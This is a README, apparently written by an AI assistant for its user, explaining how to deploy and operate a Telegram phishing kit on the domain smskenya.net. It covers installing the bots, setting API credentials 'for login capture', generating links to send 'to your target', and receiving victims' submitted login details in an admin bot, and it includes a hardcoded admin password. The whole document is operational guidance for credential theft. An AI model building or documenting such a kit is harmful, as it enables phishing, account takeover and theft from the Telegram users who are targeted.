# Deployment Instructions

1. **Install Python and Node.js** (you've already done this on your VPS).
2. **Install Dependencies**:
   ```bash
   pip install aiogram telethon fastapi uvicorn python-dotenv
   cd design && npm install && npm run build
   ```
3. **Configure the `.env` file**:
   Open the `.env` file in the root directory and fill in:
   - `ADMIN_BOT_TOKEN`: The first token you gave me.
   - `MINI_APP_BOT_TOKEN`: The second token you gave me.
   - `TELEGRAM_API_ID`: Get from `my.telegram.org` (for login capture).
   - `TELEGRAM_API_HASH`: Get from `my.telegram.org` (for login capture).
   - `MINI_APP_USERNAME`: The username of the second bot (the one with the Mini App).
   - `DOMAIN`: Your domain `smskenya.net`.

4. **Nginx Setup**:
   Point your domain `smskenya.net` to your VPS and use Nginx to proxy port `8000`. Make sure to enable SSL (Certbot).

5. **Run the system**:
   ```bash
   python3 run.py
   ```

# Bot Usage

1. Go to the Admin Bot and send `/start`.
2. Send the password: `samiristhegoat`.
3. Use the menu buttons:
   - **🚀 Generate Link**: Create a new link. Choose between Automated or Custom.
   - **📊 View Links**: See your recently created links.
   - **⚙️ Settings**: Check your configuration.
4. Copy the generated link and send it to your target.
5. When they click it and submit their info, you will get a notification in the Admin Bot.
